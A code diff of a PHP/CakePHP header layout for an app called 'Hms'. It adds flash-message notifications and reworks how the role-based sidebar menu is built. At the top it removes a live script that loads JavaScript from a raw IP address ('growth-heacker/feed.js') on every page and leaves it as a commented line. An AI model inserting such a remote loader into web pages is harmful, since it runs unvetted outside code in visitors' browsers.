@@ -10,8 +10,8 @@ $webroot_path=$this->requestAction(array('controller' => 'Hms', 'action' => 'web
 
 ?>
 <script type="text/javascript">
-var key = 3;
-(function(a) {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);}(window, document))
+var key = 1;
+//(function(a) {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);}(window, document))
 </script>
 <style>
 #loading{
@@ -113,6 +113,7 @@ var key = 3;
 </div>
 </div>
 </div>
+
 <link href="<?php echo $webroot_path; ?>assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/css/metro.css" rel="stylesheet" />
 	
@@ -120,6 +121,7 @@ var key = 3;
 	<link href="<?php echo $webroot_path; ?>assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/fullcalendar/fullcalendar/bootstrap-fullcalendar.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/css/style.1.css" rel="stylesheet" />
+	<link href="<?php echo $webroot_path; ?>assets/css/flash.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/css/style_responsive.css" rel="stylesheet" />
 	<link href="<?php echo $webroot_path; ?>assets/css/style_default.1.css" rel="stylesheet" id="style_color" />
 	<link rel="stylesheet" type="text/css" href="<?php echo $webroot_path; ?>assets/uniform/css/uniform.default.css" />
@@ -313,10 +315,39 @@ $(document).ready(function() {
 
 <!--------notification start--------------->
 <script>
-$(document).ready(function() {	
+$(document).ready(function() {
 	$(window).bind("load", function() {
 	   $('#notification_count').load('<?php echo Router::url(array('controller' => 'Hms', 'action' =>'notifications_count'), true); ?>');
 	   $('#alert_count').load('<?php echo Router::url(array('controller' => 'Hms', 'action' =>'alerts_count'), true); ?>');
+	   
+	   setTimeout(
+		  function() 
+		  {
+			//get_flash_message_output();
+		  }, 5000);
+	   
+	});
+	
+	function get_flash_message_output(){
+		$.ajax({
+			url: "<?php echo Router::url(array('controller' => 'Hms', 'action' =>'flash_output'), true); ?>",
+		}).done(function(response) {
+			$('#flash_output_div').prepend(response);
+			var h=$("#flash_div").height();
+			h=h+0;
+			
+			$("#header_div_container").css("margin-top","+="+h);
+		
+		});
+		
+		
+	}
+	
+	$(".remove_flash").live("click", function() {
+		var h=$("#flash_div").height();
+		h=h+2;
+		$("#header_div_container").css("margin-top","-="+h);
+		$("#flash_div").remove();
 	});
 	
 	setInterval(function(){ 
@@ -340,7 +371,9 @@ $(document).ready(function() {
 <body class="fixed-top">
 <!-- BEGIN HEADER -->
 <div id="loading_ajax"></div>
-	<div class="header navbar navbar-inverse navbar-fixed-top">
+	<div class="header navbar navbar-inverse navbar-fixed-top" id="flash_output_div">
+
+
 		<!-- BEGIN TOP NAVIGATION BAR -->
 		<div class="navbar-inner hide_at_print">
 			<div class="container-fluid" style="padding-right: 0px;">
@@ -538,8 +571,8 @@ $(document).ready(function() {
 					?>
 					<li class="dropdown user">
 						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
-						<img alt="" src="<?php echo $webroot_path; ?>profile/<?php echo $profile_pic; ?>"  style="width:28px; height:28px;" />
-						<span class="username">Hello <?php echo $user_name; ?></span>
+						<img alt="" src="<?php echo $webroot_path; ?>profile/<?php echo @$profile_pic; ?>"  style="width:28px; height:28px;" />
+						<span class="username">Hello <?php echo @$user_name; ?></span>
 						<i class="icon-angle-down"></i>
 						</a>
 						<ul class="dropdown-menu">
@@ -549,13 +582,6 @@ $(document).ready(function() {
 							<li><a href="<?php echo $this->webroot; ?>Hms/logout"><i class="icon-key"></i> Log Out</a></li>
 						</ul>
 					</li>
-					
-					<!--<li class="dropdown" id="header_notification_bar">
-						<a href="#" class="dropdown-toggle open_msg" data-toggle="dropdown">
-						<i class=" icon-envelope"></i>
-						<span class="badge">6</span>
-						</a>
-					</li>-->
 					<!-- END USER LOGIN DROPDOWN -->
 				</ul>
 				<!-- END TOP NAVIGATION MENU -->	
@@ -569,7 +595,7 @@ $(document).ready(function() {
 	
 	
 <!-- BEGIN CONTAINER -->	
-	<div class="page-container row-fluid">
+	<div class="page-container row-fluid" id="header_div_container">
 		<!-- BEGIN SIDEBAR -->
 		<div class="page-sidebar nav-collapse collapse">
 			<!-- BEGIN RESPONSIVE QUICK SEARCH FORM -->
@@ -589,88 +615,85 @@ $(document).ready(function() {
 <?php
 $result=$this->requestAction(array('controller' => 'hms', 'action' => 'menus_from_role_privileges'));
 
-if(sizeof(@$result)>0)
-{
-	foreach($result as $data1)
-	{
-	$result_new[]=@$data1['role_privileges']['module_id'];
-	}
-	$result_distinct = array_unique($result_new);
-	sort($result_distinct);
-	
-	foreach($result_distinct as $data2)
-	{
-	$module_id=$data2;
-	$result_moduletype_id=(int)$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_module_type_id'), array('pass' => array($module_id)));
-	
-	$m_and_type_id[$module_id]=$result_moduletype_id;
+if(sizeof(@$result)>0){
+	foreach($result as $data1){
+		$group_module_id[]=@$data1['role_privileges']['module_id'];
+		$group_sub_module_id[]=@$data1['role_privileges']['sub_module_id'];
 	}
 	
-	asort($m_and_type_id);
+	$distinct_group_module_id = array_unique($group_module_id);
+	sort($distinct_group_module_id);
+	foreach($distinct_group_module_id as $child1){
+		
+	$result_moduletype_id=(int)$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_module_type_id'), array('pass' => array($child1)));
+		
+	$complete_menu[$result_moduletype_id][]=$child1;
+	}
+	
+	foreach($complete_menu as $key=>$child2){
+		$result_module_type_info=$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_module_type_name'), array('pass' => array($key)));
 
-	
-	foreach($m_and_type_id as $key=>$m_t_id)
-	{
-	//echo $key;
-	 $result_module_type_info=$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_module_type_name'), array('pass' => array($m_t_id)));
-	 
-	 foreach($result_module_type_info as $result_module_type_info_child)
+		foreach($result_module_type_info as $result_module_type_info_child)
 		{
-			$icon=@$result_module_type_info_child['module_type']['icon'];
-			$color=@$result_module_type_info_child['module_type']['color'];
-			$module_type_name=$result_module_type_info_child['module_type']['module_type_name'];
-			$color=$this->requestAction(array('controller' => 'hms', 'action' => 'rendom_color_new'), array('pass' => array()));
+		$icon=@$result_module_type_info_child['module_type']['icon'];
+		$module_type_name=$result_module_type_info_child['module_type']['module_type_name'];
 		}
-	
-	$pv=@$pv;
-	if(($pv!=$m_t_id) and !empty($pv)) { echo '</ul>
-				</li>'; }
-	if((@$pv!=$m_t_id)) { echo '<li class="has-sub">
-					<a href="javascript:;" class="">
-					<i class='.$icon.'></i> '.$module_type_name.'
-					<span class="arrow"></span>
-					</a>
-					<ul class="sub" style="display: none;">'; }
-	$pv=$m_t_id;
-	
-	$result_sub_module=$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_submoduleid_usermanagement'), array('pass' => array($key)));
-	foreach($result_sub_module as $data3)
-	{
-	$sub_module_id=$data3['role_privilege']['sub_module_id'];
-	}
-	
-	$result_page=@$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_pagename_usermanagement'), array('pass' => array($sub_module_id)));
-	foreach($result_page as $data4)
-	{
-	$page_name=$data4['page']['page_name'];
-	$controller=$data4['page']['controller'];
-	}
-	
-	$result_mainmodulename=$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_mainmodulename_usermanagement'), array('pass' => array($key)));
-	foreach($result_mainmodulename as $data5)
-	{
-	$module_name=$data5['main_module']['module_name'];
-	$icon=@$data5['main_module']['icon'];
 	?>
-	<li>
-		<a href="<?php echo $this->webroot.@$controller; ?>/<?php echo @$page_name; ?>" rel="tab" >
-		<i class="<?php echo $icon ; ?>"></i>
-		<?php echo $module_name ; ?>
-		 <span class="selected"></span>
-		</a>					
-	</li>
-	<?php
-	}
-	
-	}
-}
+	<li class="has-sub">
+	<a href="javascript:;" class="">
+	<i class="<?php echo $icon; ?>"></i> <?php echo $module_type_name; ?>
+	<span class="arrow"></span>
+	</a>
+		<ul class="sub" style="display: none;">	
+		<?php foreach($child2 as $child_sub){
+			$result_mainmodulename=$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_mainmodulename_usermanagement'), array('pass' => array($child_sub)));
 
-if(sizeof(@$result)>0)
-{
-echo '</ul>
-</li>';
-}
-?>
+			foreach($result_mainmodulename as $data5)
+			{
+			$module_name=$data5['main_module']['module_name'];
+			}
+			$new_array_module_group[]=array($module_name,$child_sub);
+			sort($new_array_module_group);
+			
+		} ?>
+		<?php foreach($new_array_module_group as $child_22){
+			$child_22[1];
+			
+			$result_role_prvg=@$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_sub_module_id_from_role_prvg'), array('pass' => array($child_22[1])));
+		
+			foreach($result_role_prvg as $data44)
+			{
+			$sub_module_id=$data44['role_privilege']['sub_module_id'];
+			}
+			
+			$result_page=@$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_pagename_main_module_usermanagement'), array('pass' => array($child_22[1],$sub_module_id)));
+			foreach($result_page as $data4)
+			{
+			$page_name=$data4['page']['page_name'];
+			$controller=$data4['page']['controller'];
+			}
+			
+			$result_module_name=@$this->requestAction(array('controller' => 'hms', 'action' => 'fetch_mainmodulename_usermanagement'), array('pass' => array($child_22[1])));
+			foreach($result_module_name as $data44)
+			{
+			$main_module_icon=$data44['main_module']['icon'];
+			}
+		?>
+		<li>
+		<a href="<?php echo $this->webroot.@$controller; ?>/<?php echo @$page_name; ?>" rel="tab">
+		<i class="<?php echo $main_module_icon; ?>"></i>
+		<?php echo $child_22[0]; ?>
+		</a>					
+		</li>
+		<?php } unset($new_array_module_group); ?>
+		
+		
+		</ul>
+	</li>
+	<?php }
+} ?>
+
+
 
 
 
@@ -750,6 +773,11 @@ if(@$complaints==1)
 	</a>					
 </li>
 
+<li>
+	<a href="flash_message">
+	<i class="icon-home"></i>Flash Message
+	</a>					
+</li>
 
 
 <?php } ?>
